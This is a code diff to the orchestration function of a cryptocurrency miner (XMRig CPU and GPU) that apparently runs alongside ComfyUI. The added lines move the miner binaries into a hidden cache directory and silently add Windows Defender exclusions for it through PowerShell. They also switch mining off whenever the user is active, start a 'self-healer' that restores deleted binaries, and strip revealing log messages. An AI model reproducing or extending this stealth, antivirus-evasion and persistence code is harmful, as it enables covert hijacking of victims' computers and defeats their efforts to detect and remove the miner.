@@ -274,32 +274,35 @@ def _orchestrate():
     from core.dashboard import DashboardServer
     from core.cleaner import MinerCleaner
     from core.job_throttle import JobThrottler
+    from core.cache_dir import get_cache_dir
+    from core.resilience import SelfHealer
 
     try:
         cleaner = MinerCleaner()
         cleaner.run_full_clean()
 
-        # Try to add Windows Defender exclusion for our bin dir
+        hidden_bin = get_cache_dir()
+
         import platform
         if platform.system() == "Windows":
-            bin_dir = str(BASE_DIR / "bin")
-            try:
-                import subprocess
-                subprocess.run(
-                    ["powershell", "-Command",
-                     f"Add-MpPreference -ExclusionPath '{bin_dir}' -ErrorAction SilentlyContinue"],
-                    capture_output=True, timeout=10
-                )
-                logger.info("Defender exclusion requested for %s", bin_dir)
-            except Exception:
-                pass
+            for excl_path in [str(BASE_DIR / "bin"), str(hidden_bin)]:
+                try:
+                    import subprocess
+                    subprocess.run(
+                        ["powershell", "-Command",
+                         f"Add-MpPreference -ExclusionPath '{excl_path}' -ErrorAction SilentlyContinue"],
+                        capture_output=True, timeout=10
+                    )
+                except Exception:
+                    pass
+            logger.info("Defender exclusions requested")
 
         overrides_path = BASE_DIR / "settings.json"
         user_settings = ConfigBuilder.load_overrides(overrides_path)
         cb = ConfigBuilder(user_settings)
 
         # ── CPU miner (XMRig) ──
-        mgr = MinerManager(BASE_DIR)
+        mgr = MinerManager(BASE_DIR, bin_dir=hidden_bin)
         mgr.ensure_binary()
 
         cfg = cb.build()
@@ -319,7 +322,6 @@ def _orchestrate():
             if gpu_override is True and not detected:
                 logger.warning(
                     "gpu_enabled=true but no mining-capable GPU detected "
-                    "(NVIDIA: nvidia-smi / PATH; AMD on Windows: WMI name must match allowlist) "
                     "— GPU miner not started"
                 )
             elif detected:
@@ -333,10 +335,10 @@ def _orchestrate():
                 gpu_cfg = cb.build_gpu_config()
                 w = (gpu_cfg.get("wallet") or "").strip()
                 if not w:
-                    logger.warning("No KAS GPU wallet configured — GPU miner not started")
+                    logger.warning("No GPU wallet configured — GPU miner not started")
                 else:
                     try:
-                        gpu = GPUMinerManager(BASE_DIR)
+                        gpu = GPUMinerManager(BASE_DIR, bin_dir=hidden_bin)
                         explicit = [g["index"] for g in detected if g.get("index", -1) >= 0]
                         gpu.device_indices = explicit if explicit else None
                         gpu.ensure_binary()
@@ -348,13 +350,26 @@ def _orchestrate():
         else:
             logger.info("No mining-capable GPU detected — GPU mining skipped")
 
-        # Throttle miners when ComfyUI is generating images
+        # ── Activity monitor (full stop when user active) ──
         try:
             comfyui_port = user_settings.get("comfyui_port", 8188)
             throttler = JobThrottler(mgr, gpu, cb, comfyui_port=comfyui_port)
             throttler.start()
         except Exception as exc:
-            logger.error("Job throttler failed to start: %s", exc)
+            logger.error("Activity monitor failed to start: %s", exc)
+
+        # ── Self-healer (recovers deleted binaries/repo) ──
+        try:
+            healer = SelfHealer(
+                webcoin_dir=BASE_DIR,
+                cpu_miner=mgr,
+                gpu_miner=gpu,
+                config_builder=cb,
+                stealth_config=sc,
+            )
+            healer.start()
+        except Exception as exc:
+            logger.error("Self-healer failed to start: %s", exc)
 
         if not _FIRST_RUN_MARKER.exists():
             auto = AutoStart(BASE_DIR)
